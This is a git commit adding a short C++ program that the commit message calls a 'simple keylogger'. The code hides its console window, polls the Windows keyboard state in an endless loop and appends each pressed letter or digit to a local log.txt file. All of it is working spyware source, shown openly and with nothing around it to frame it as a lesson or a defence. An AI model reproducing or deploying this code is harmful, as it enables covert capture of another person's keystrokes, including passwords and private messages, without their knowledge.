d9205fab426aa0fc321ece66ce5d1d09db3e05b3
Nicolò <vincinicolo98@gmail.com>
2022-11-17 13:21:53 +0100

    Simple keylogger with getKeyBoardState

---
+++ src/cpp/getKeyboardState/src0.cpp
@@ -0,0 +1,28 @@
+#include <windows.h>
+#include <fstream>
+#include <algorithm>
+
+int main()
+{
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    std::ofstream log;
+    unsigned char state[256];
+    GetKeyboardState(state);
+    unsigned char tmp[256];
+    while (true)
+    {
+        std::copy(std::begin(state), std::end(state), std::begin(tmp));
+        GetKeyState(0);
+        GetKeyboardState(state);
+        for (int i = 48; i <= 90; i++)
+        {
+            if ((int(tmp[i]) == 0 && int(state[i]) == 129) || ((int(tmp[i]) == 128 && int(state[i]) == 0)))
+            {
+                log.open("log.txt", std::ofstream::app);
+                log << char(i) << "\n";
+                log.close();
+            }
+        }
+    }
+    return 0;
+}
